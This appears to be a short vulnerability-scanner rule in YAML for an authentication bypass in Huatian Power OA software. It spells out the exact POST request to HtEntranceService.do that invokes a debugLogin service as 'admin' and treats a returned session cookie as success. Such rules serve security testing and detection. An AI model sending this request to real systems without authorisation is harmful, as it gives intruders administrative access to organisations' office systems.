name: huatian-auth-bypass
rules:
  - method: POST
    path: "/OAapp/HtEntranceService.do"
    headers:
      Content-Type: application/x-www-form-urlencoded
    body: '{"service":"debugService","method":"debugLogin","code":"admin",}'
    expression: |
      response.status == 200 && response.headers["Set-Cookie"].contains("JSESSIONID=")
detail:
  author: lxy
  links:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book
  description: "华天动力OA 认证绕过漏洞"
